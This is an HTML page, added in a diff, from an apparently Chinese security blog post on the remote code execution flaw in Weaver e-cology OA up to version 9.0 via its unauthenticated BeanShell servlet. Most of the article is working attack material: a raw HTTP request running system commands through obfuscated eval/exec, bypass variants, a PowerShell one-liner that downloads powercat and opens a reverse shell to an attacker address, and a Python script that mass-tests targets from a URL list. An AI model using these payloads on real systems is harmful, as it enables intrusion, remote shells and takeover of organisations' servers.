@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="泛微OA E-cology &lt;&#x3D;9.0 远程代码执行漏洞一、漏洞简介2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cologyOA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口,可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行,漏洞等级严重. 二、漏洞影响e-cology &lt;&#x3D;9.0 三、复现过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20E-cology%20_=9.0%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="泛微OA E-cology &lt;&#x3D;9.0 远程代码执行漏洞一、漏洞简介2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cologyOA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口,可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行,漏洞等级严重. 二、漏洞影响e-cology &lt;&#x3D;9.0 三、复现过">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:09.918Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-泛微oa/泛微OA E-cology _=9.0 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20E-cology%20_=9.0%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.918Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="泛微OA-E-cology-lt-9-0-远程代码执行漏洞"><a href="#泛微OA-E-cology-lt-9-0-远程代码执行漏洞" class="headerlink" title="泛微OA E-cology &lt;=9.0 远程代码执行漏洞"></a>泛微OA E-cology &lt;=9.0 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology<br>OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口,<br>可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行,<br>漏洞等级严重.</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>e-cology &lt;=9.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><pre><code>Set-Cookie: ecology_JSessionId=
+</code></pre>
+<p>ecology</p>
+<pre><code>/weaver/bsh.servlet.BshServlet
+</code></pre>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre><code>POST /weaver/bsh.servlet.BshServlet HTTP/1.1
+Host: www.0-sec.org:8088
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Length: 98
+Content-Type: application/x-www-form-urlencoded
+
+bsh.script=eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw
+</code></pre>
+<p><em><strong>利用技巧</strong></em></p>
+<ul>
+<li>  1.其他形式绕过</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;); 也可以换成 ex\u0065c(&quot;cmd /c dir&quot;);
+</code></pre>
+<ul>
+<li>  2.泛微多数都是windows环境, 反弹shell可以使用pcat</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>powershell IEX(New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c ip -p 6666 -e cmd
+</code></pre>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>useage</p>
+<pre><code>#1.install python Dependencies Library 
+pip install requests
+
+#2.批量脚本 执行 
+python Weaver-Ecology-OA_RCE-exp.py 
+
+
+url.txt文件中 是url地址 需要带http协议
+#/usr/bin/python
+#coding:utf-8
+#Author:Ja0k
+#For Weaver-Ecology-OA_RCE
+
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+import requests,sys
+
+headers = &#123;
+    &#39;Content-Type&#39;: &#39;text/xml; charset=utf-8&#39;,
+    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,
+    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0&#39;,
+    &#39;Cache-Control&#39;: &#39;max-age=0&#39;,
+    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,
+    &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,
+    &#39;Content-Length&#39;: &#39;578&#39;
+&#125;
+
+proxies= &#123;&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;&#125;
+            
+def Poc_check(target):
+
+    Url_Payload1=&quot;/bsh.servlet.BshServlet&quot;
+    Url_Payload2=&quot;/weaver/bsh.servlet.BshServlet&quot;
+    Url_Payload3=&quot;/weaveroa/bsh.servlet.BshServlet&quot;
+    Url_Payload4=&quot;/oa/bsh.servlet.BshServlet&quot;
+    
+    Data_Payload1=&quot;&quot;&quot;bsh.script=exec(&quot;whoami&quot;);&amp;bsh.servlet.output=raw&quot;&quot;&quot;
+    Data_Payload2= &quot;&quot;&quot;bsh.script=\u0065\u0078\u0065\u0063(&quot;whoami&quot;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw&quot;&quot;&quot;
+    Data_Payload3= &quot;&quot;&quot;bsh.script=eval%00(&quot;ex&quot;%2b&quot;ec(bsh.httpServletRequest.getParameter(\\&quot;command\\&quot;))&quot;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw&amp;command=whoami&quot;&quot;&quot;
+    for Url_Payload in (Url_Payload1,Url_Payload2,Url_Payload3,Url_Payload4):
+        url= target + Url_Payload
+        for Data_payload in (Data_Payload1,Data_Payload2,Data_Payload3): 
+            try:
+                http_response = requests.post(url,data=Data_payload,headers=headers,verify=False)
+                #print http_response.status_code
+                if http_response.status_code == 200:
+                    if &quot;;&lt;/script&gt;&quot; not in (http_response.content):
+                        if &quot;Login.jsp&quot; not in (http_response.content):
+                            if &quot;Error&quot; not in (http_response.content):
+                                print &quot;&#123;0&#125; is a E-cologyOA_RCE Vulnerability&quot;.format(url)
+                                print &quot;Server Current Username：&#123;0&#125;&quot;.format(http_response.content)
+                elif http_response.status_code == 500:
+                    print &quot;&#123;0&#125;500 maybe is Weaver-EcologyOA，Please confirm by yourself &quot;.format(url)
+                else:
+                    pass              
+            except Exception,Error:
+                pass    
+    
+if __name__ == &#39;__main__&#39;:
+    for line in open(sys.argv[1]).readlines():
+        target=line.strip()
+        Poc_check(target)
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20E-cology%20_=9.0%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r05t00p4y8v11nq25tjd" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20V8%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%20E-Bridge%20%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
